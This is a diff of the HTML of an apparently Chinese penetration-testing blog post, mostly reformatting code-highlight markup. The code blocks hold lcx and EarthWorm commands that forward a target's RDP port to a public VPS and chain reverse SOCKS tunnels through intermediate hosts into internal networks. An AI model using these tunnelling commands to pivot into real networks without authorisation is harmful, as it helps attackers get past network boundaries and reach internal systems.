@@ -45,18 +45,18 @@
 <li>listen 服务端接服务端     -listen ConnectPort TransmitPort</li>
 </ul>
 <p>再来个例子<a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
-<div class="highlight"><pre><span></span><span class="n">lcx</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">slave</span> <span class="mi">139</span><span class="p">.</span><span class="n">xx</span><span class="p">.</span><span class="n">xx</span><span class="p">.</span><span class="n">xx</span> <span class="mi">9000</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">2</span> <span class="mi">3389</span> <span class="o">//</span><span class="err">目标机器的所有数据转发到公网</span><span class="n">vps的9000端口</span>
-<span class="n">lcx</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="k">listen</span> <span class="mi">9000</span> <span class="mi">5555</span>   <span class="o">//</span><span class="err">将本机</span><span class="mi">9000</span><span class="err">端口监听的数据转发到本机</span><span class="mi">5555</span><span class="err">端口</span>
-<span class="err">通过上门两个端口转发，可以登陆</span><span class="n">vps上面的5555端口</span><span class="err">，或者</span><span class="n">vps上面127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="err">的的</span><span class="mi">5555</span><span class="err">端口</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">lcx.exe -slave 139.xx.xx.xx 9000 10.10.10.2 3389 //目标机器的所有数据转发到公网vps的9000端口</span>
+<span class="err">lcx.exe -listen 9000 5555   //将本机9000端口监听的数据转发到本机5555端口</span>
+<span class="err">通过上门两个端口转发，可以登陆vps上面的5555端口，或者vps上面127.0.0.1的的5555端口</span>
+</code></pre></div>
 
 
 <p>上面两个对应的ew是这么写的：</p>
-<div class="highlight"><pre><span></span><span class="n">ew</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_slave</span> <span class="o">-</span><span class="n">d</span> <span class="mi">45</span><span class="p">.</span><span class="n">xx</span><span class="p">.</span><span class="n">xx</span><span class="p">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">e</span> <span class="mi">9000</span> <span class="o">-</span><span class="n">f</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span><span class="k">g</span> <span class="mi">3389</span>
+<div class="highlight"><pre><span></span><code><span class="n">ew</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_slave</span> <span class="o">-</span><span class="n">d</span> <span class="mi">45</span><span class="p">.</span><span class="n">xx</span><span class="p">.</span><span class="n">xx</span><span class="p">.</span><span class="n">xx</span> <span class="o">-</span><span class="n">e</span> <span class="mi">9000</span> <span class="o">-</span><span class="n">f</span> <span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span><span class="k">g</span> <span class="mi">3389</span>
 <span class="p">.</span><span class="o">/</span><span class="n">ew_for_linux64</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_listen</span> <span class="o">-</span><span class="n">l</span> <span class="mi">5555</span> <span class="o">-</span><span class="n">e</span> <span class="mi">9000</span>
 
 <span class="err">第一个靶机可以抓发</span><span class="n">vps访问不到的ip</span><span class="err">，比如</span><span class="n">linux的22端口</span><span class="err">，也就是把这个机子作为跳板。</span> 
-</pre></div>
+</code></pre></div>
 
 
 <p>代理: </p>
@@ -67,7 +67,7 @@
 <ul>
 <li>如果没有公网IP，但是可以访问公网</li>
 </ul>
-<div class="highlight"><pre><span></span><span class="err">首先在公网</span><span class="n">IP运行</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">首先在公网</span><span class="n">IP运行</span><span class="o">:</span>
 
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rcsocks</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span>
 
@@ -76,32 +76,32 @@
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rssocks</span> <span class="o">-</span><span class="n">d</span> <span class="mi">45</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span>
 
 <span class="err">然后就可以以公网的</span><span class="mi">1080</span><span class="err">作为代理进入内网</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>以上是最简单最基本的应用,二级和三级的链接可以看下面的文章：
 <a href="https://xianzhi.aliyun.com/forum/read/735.html">https://xianzhi.aliyun.com/forum/read/735.html</a></p>
 <p>其实上面的文章简单总结下就是ew官网写的那几条命令</p>
 <h2>二级级联</h2>
-<div class="highlight"><pre><span></span><span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">ssocksd</span> <span class="o">-</span><span class="n">l</span> <span class="mi">9999</span>    <span class="o">//</span><span class="err">在</span><span class="n">B上面开一个9999的socks代理</span>
-<span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_tran</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">f</span> <span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span> <span class="o">-</span><span class="k">g</span> <span class="mi">9999</span> <span class="o">//</span><span class="err">在具有公网</span><span class="n">IP的主机上连接B开了代理的机子</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">ew -s ssocksd -l 9999    //在B上面开一个9999的socks代理</span>
+<span class="err">ew -s lcx_tran -l 1080 -f x.x.x.x -g 9999 //在具有公网IP的主机上连接B开了代理的机子</span>
+</code></pre></div>
 
 
 <p>如果x.x.x.x没有公网IP，但是可以连通公网IP，就需要以下的步骤</p>
-<div class="highlight"><pre><span></span><span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_listen</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span> <span class="o">//</span><span class="n">vps运行</span><span class="err">，把</span><span class="mi">1080</span><span class="err">接受到的数据发送给</span><span class="mi">8888</span>
+<div class="highlight"><pre><span></span><code><span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_listen</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span> <span class="o">//</span><span class="n">vps运行</span><span class="err">，把</span><span class="mi">1080</span><span class="err">接受到的数据发送给</span><span class="mi">8888</span>
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">ssocksd</span> <span class="o">-</span><span class="n">l</span> <span class="mi">9999</span> <span class="o">//</span><span class="err">可以接触核心网络的</span><span class="n">C主机上面开一个9999端口的代理</span>
 <span class="err">接下来就是中间的</span><span class="n">B主机连接vps和C主机</span>
 
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_slave</span> <span class="o">-</span><span class="n">d</span> <span class="n">VPS的IP</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span> <span class="o">-</span><span class="n">f</span> <span class="n">C的IP</span> <span class="o">-</span><span class="k">g</span> <span class="mi">9999</span>
 
 <span class="err">至此，隧道打通</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>最后来一个复杂的三级网络:
 先说下最简单的反代，前面说过:</p>
-<div class="highlight"><pre><span></span><span class="err">首先在公网</span><span class="n">IP运行</span><span class="o">:</span>
+<div class="highlight"><pre><span></span><code><span class="err">首先在公网</span><span class="n">IP运行</span><span class="o">:</span>
 
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rcsocks</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span>
 
@@ -110,17 +110,17 @@
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rssocks</span> <span class="o">-</span><span class="n">d</span> <span class="mi">45</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span><span class="o">.</span><span class="na">x</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span>
 
 <span class="err">然后就可以以公网的</span><span class="mi">1080</span><span class="err">作为代理进入内网</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>复杂的三级就是在这两个主机之间加了两个主机</p>
-<div class="highlight"><pre><span></span><span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rcsocks</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span> <span class="o">//</span><span class="err">把</span><span class="mi">1080</span><span class="err">端口收到的请求转给</span><span class="mi">8888</span><span class="err">端口</span>
+<div class="highlight"><pre><span></span><code><span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rcsocks</span> <span class="o">-</span><span class="n">l</span> <span class="mi">1080</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span> <span class="o">//</span><span class="err">把</span><span class="mi">1080</span><span class="err">端口收到的请求转给</span><span class="mi">8888</span><span class="err">端口</span>
 
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_slave</span> <span class="o">-</span><span class="n">d</span> <span class="mi">43</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span> <span class="o">-</span><span class="n">e</span> <span class="mi">8888</span> <span class="o">-</span><span class="n">f</span> <span class="mi">10</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span> <span class="o">-</span><span class="k">g</span> <span class="mi">9999</span>
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">lcx_listen</span> <span class="o">-</span><span class="n">l</span> <span class="mi">9999</span> <span class="o">-</span><span class="n">e</span> <span class="mi">7777</span>
 
 <span class="n">ew</span> <span class="o">-</span><span class="n">s</span> <span class="n">rssocks</span> <span class="o">-</span><span class="n">d</span> <span class="mi">11</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span> <span class="mi">7777</span>
-</pre></div>
+</code></pre></div>
     </div><!-- /.entry-content -->
 
   </article>
